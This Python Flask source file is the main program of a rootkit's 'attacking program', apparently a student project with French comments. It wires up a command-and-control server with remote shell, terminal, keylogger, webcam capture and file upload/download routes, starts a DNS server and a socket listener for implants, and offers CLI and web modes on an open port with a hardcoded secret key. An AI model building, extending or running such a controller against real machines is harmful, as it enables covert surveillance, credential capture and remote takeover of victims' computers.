from flask import Flask
import os
import threading

from attacking_program.config import UPLOAD_FOLDER, DOWNLOAD_FOLDER
from attacking_program.routes import (
    auth_bp, dashboard_bp, terminal_bp, upload_bp, download_bp,
    shell_bp, keylogger_bp, webcam_bp, history_bp
)
from utils.socat import socket_listener, start_dns_server
from utils.cli import run_cli

app = Flask(__name__)
app.secret_key = "epirootkit_secret"
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Créer les dossiers si nécessaires
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Enregistrement des blueprints
app.register_blueprint(auth_bp)
app.register_blueprint(dashboard_bp)
app.register_blueprint(terminal_bp)
app.register_blueprint(upload_bp)
app.register_blueprint(download_bp)
app.register_blueprint(shell_bp)
app.register_blueprint(keylogger_bp)
app.register_blueprint(webcam_bp)
app.register_blueprint(history_bp)

def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    elif choix == '2':
        start_dns_server()
        threading.Thread(target=socket_listener, daemon=True).start()
        app.run(host='0.0.0.0', port=5000)
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

if __name__ == '__main__':
    main()
